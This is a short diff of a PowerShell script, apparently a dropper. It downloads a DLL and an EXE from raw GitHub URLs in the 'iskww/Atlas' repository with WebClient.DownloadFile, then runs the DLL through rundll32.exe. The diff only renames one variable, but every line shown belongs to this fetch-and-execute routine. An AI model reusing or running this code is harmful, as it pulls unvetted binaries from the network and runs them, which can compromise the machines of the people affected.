@@ -10,6 +10,6 @@ $uri = "https://github.com/iskww/Atlas/raw/main/win32.dll";
 $uri2 = "https://github.com/iskww/Atlas/raw/main/reports.exe";
 $cli = New-Object System.Net.WebClient;
 $cmd = $cli.DownloadFile($uri, $location);
-$cmd = $cli.DownloadFile($uri2, $location2);
+$cmd2 = $cli.DownloadFile($uri2, $location2);
 Set-Location $path_new
 Start-Process rundll32.exe -ArgumentList "$file, $call" ;
